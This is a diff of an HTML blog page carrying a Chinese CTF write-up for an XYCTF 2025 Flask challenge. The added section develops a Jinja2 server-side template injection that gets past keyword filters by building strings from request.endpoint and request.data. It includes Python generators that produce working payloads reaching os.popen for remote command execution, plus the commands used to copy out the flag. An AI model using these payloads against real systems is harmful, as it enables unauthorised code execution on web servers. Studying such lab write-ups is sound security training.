@@ -22,9 +22,18 @@
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250802095729234.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250802100802404.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250802104113272.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804155113492.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250802190149906.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804161937541.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804163037505.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804164401387.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804173931986.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804174211199.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804175316475.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804175754058.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250804175931307.png">
 <meta property="article:published_time" content="2025-07-27T12:30:31.000Z">
-<meta property="article:modified_time" content="2025-08-04T05:32:24.783Z">
+<meta property="article:modified_time" content="2025-08-04T10:00:49.212Z">
 <meta property="article:author" content="wArn">
 <meta property="article:tag" content="CTFwp">
 <meta name="twitter:card" content="summary">
@@ -157,7 +166,7 @@
       
         <time datetime="2025-07-27T12:30:31.000Z" class="dt-published" itemprop="datePublished">2025-07-27</time>
         
-        (Updated: <time datetime="2025-08-04T05:32:24.783Z" class="dt-updated" itemprop="dateModified">2025-08-04</time>)
+        (Updated: <time datetime="2025-08-04T10:00:49.212Z" class="dt-updated" itemprop="dateModified">2025-08-04</time>)
         
       
     </div>
@@ -292,14 +301,50 @@
 <p>我以前认为request.data主要传json数据，必须有Content-Type:application&#x2F;json，去官方文档查看了一下：</p>
 <img src="/CTFwp/XYCTF-2025/image-20250802104113272.png" class="" title="image-20250802104113272">
 
-<p>接收来自stream的原始数据，加入数据来自表单，则为空。</p>
+<p>接收来自stream的原始数据，如果加入数据来自表单，则为空。</p>
 <p>即使数据来自表单，也要获取原始数据，可以使用get_data()。</p>
-<p>不管是get方法还是post方法，request.data都可以收到数据。</p>
+<p>在GET方法或不是表单请求的post方法下，如果在最下面写入数据都可以被request.data捕捉到。</p>
+<p>好多关键字，和字符被过滤了，r而equest对象没有被过滤，可以考虑构造data，实现任意字符构造。</p>
+<p>request.endpoint用于显示与当前路由绑定的函数名。</p>
+<img src="/CTFwp/XYCTF-2025/image-20250804155113492.png" class="" title="image-20250804155113492">
+
+<p>当前的函数名为<code>r3al_ins1de_th0ught</code>，存在<code>d、a、t</code>，可以用于构造data。</p>
+<p>连接字符串的话，可以使用~。</p>
 <img src="/CTFwp/XYCTF-2025/image-20250802190149906.png" class="" title="image-20250802190149906">
 
-<p>~ 在 ssti 模板注入中可以用于连接字符串。</p>
-<p>request.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = []</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%for i in request.endpoint|slice(1)%&#125;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>)) <span class="comment"># slice 生成一个迭代器， 1 分成一组。</span></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%print(i)%&#125;&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%endfor%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(payload))</span><br></pre></td></tr></table></figure>
 
+<img src="/CTFwp/XYCTF-2025/image-20250804161937541.png" class="" title="image-20250804161937541">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = []</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%for i in request.endpoint|slice(1)%&#125;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>))</span><br><span class="line">method = <span class="string">&#x27;r3al_ins1de_th0ught&#x27;</span></span><br><span class="line">dat = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;data&#x27;</span>:</span><br><span class="line">    dat += <span class="string">&#x27;i.&#x27;</span> + <span class="built_in">str</span>(method.find(i)) + <span class="string">&#x27;~&#x27;</span></span><br><span class="line">dat = dat[:-<span class="number">1</span>]</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%print(&#x27;</span>+dat+<span class="string">&#x27;)%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%endfor%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(payload))</span><br></pre></td></tr></table></figure>
+
+<img src="/CTFwp/XYCTF-2025/image-20250804163037505.png" class="" title="image-20250804163037505">
+
+<p>现在已经构造出来data了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = []</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%for i in request.endpoint|slice(1)%&#125;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>)) <span class="comment"># slice 生成一个迭代器， 1 分成一组。</span></span><br><span class="line">method = <span class="string">&#x27;r3al_ins1de_th0ught&#x27;</span></span><br><span class="line">dat = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;data&#x27;</span>:</span><br><span class="line">    dat += <span class="string">&#x27;i.&#x27;</span> + <span class="built_in">str</span>(method.find(i)) + <span class="string">&#x27;~&#x27;</span></span><br><span class="line">dat = dat[:-<span class="number">1</span>]</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%set dat=request|attr(&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>) + dat + <span class="string">&#x27;)%&#125;&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%for k in dat|string|slice(1)%&#125;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>)) <span class="comment"># 使用 string 的原因： request.data 是字节数据，字节数据通过slice转化为可迭代对象会进行编码（相当于python里面的ord函数）</span></span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%print(k)%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%endfor%&#125;&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%endfor%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(payload))</span><br></pre></td></tr></table></figure>
+
+<p>下面图片用的i，不用管这个，以上面代码为准。</p>
+<img src="/CTFwp/XYCTF-2025/image-20250804164401387.png" class="" title="image-20250804164401387">
+
+<p>可以看到列表从第2个开始是我们输入的字符(从0开始)，我们在索引的时候，要加上2。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = []</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%for i in request.endpoint|slice(1)%&#125;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>)) <span class="comment"># slice 生成一个迭代器， 1 分成一组。</span></span><br><span class="line">method = <span class="string">&#x27;r3al_ins1de_th0ught&#x27;</span></span><br><span class="line">dat = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;data&#x27;</span>:</span><br><span class="line">    dat += <span class="string">&#x27;i.&#x27;</span> + <span class="built_in">str</span>(method.find(i)) + <span class="string">&#x27;~&#x27;</span></span><br><span class="line">dat = dat[:-<span class="number">1</span>]</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%set dat=request|attr(&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>) + dat + <span class="string">&#x27;)%&#125;&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%for k in dat|string|slice(1)%&#125;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>)) <span class="comment"># 使用 string 的原因： request.data 是字节数据，字节数据通过slice转化为可迭代对象会进行编码（相当于python里面的ord函数）</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encoding_char</span>(<span class="params">rce</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line"></span><br><span class="line">    payloadstr = <span class="string">&quot;&#123;%set so=request|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)%&#125;&#123;%print(request|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(so))%&#125;&#123;%print(so|attr(&#x27;popen&#x27;)(\&#x27;&quot;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>) + rce + <span class="string">&quot;\&#x27;)|attr(&#x27;read&#x27;)())%&#125;&quot;</span></span><br><span class="line">    <span class="comment"># 命令执行的payload</span></span><br><span class="line">    encoding_list = re.findall(<span class="string">r&#x27;\&#x27;([_ a-z0-9/]+)\&#x27;&#x27;</span>,payloadstr)</span><br><span class="line">    <span class="comment"># 获取被过滤的关键字</span></span><br><span class="line">    char = <span class="string">&#x27;_ 0123456789abcdefghijklmnopqrstuvwxyz/&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> encoding_list:</span><br><span class="line">        temporary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            temporary += <span class="string">&#x27;k.&#x27;</span> + <span class="built_in">str</span>(char.find(j)+<span class="number">2</span>) + <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        temporary = temporary[:-<span class="number">1</span>]</span><br><span class="line">        payloadstr = payloadstr.replace(<span class="string">&quot;\&#x27;&quot;</span> + i + <span class="string">&quot;\&#x27;&quot;</span>, temporary)</span><br><span class="line">        <span class="comment"># 加密并替换过滤的关键字</span></span><br><span class="line">    payload.append(payloadstr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoding_char(command)</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%endfor%&#125;&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;&#123;%endfor%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(payload))</span><br></pre></td></tr></table></figure>
+
+<img src="/CTFwp/XYCTF-2025/image-20250804173931986.png" class="" title="image-20250804173931986">
+
+<p>确实可以执行。</p>
+<p><code>command=&#39;ls /&#39;</code>。</p>
+<img src="/CTFwp/XYCTF-2025/image-20250804174211199.png" class="" title="image-20250804174211199">
+
+<p><code>command=&#39;stat /flag_h3r3&#39;</code>。</p>
+<img src="/CTFwp/XYCTF-2025/image-20250804175316475.png" class="" title="image-20250804175316475">
+
+<p>文件超级大，我们将其放到静态目录，下载。</p>
+<p><code>command=&#39;mkdir /app/static&#39;</code>，创建静态目录。</p>
+<p><code>command=&#39;cp /flag_h3r3 /app/static&#39;</code></p>
+<img src="/CTFwp/XYCTF-2025/image-20250804175754058.png" class="" title="image-20250804175754058">
+
+<p>访问&#x2F;static&#x2F;flag_h3r3，下载文件，flag内容就在文件里面。</p>
+<img src="/CTFwp/XYCTF-2025/image-20250804175931307.png" class="" title="image-20250804175931307">
   </div>
 </article>
 
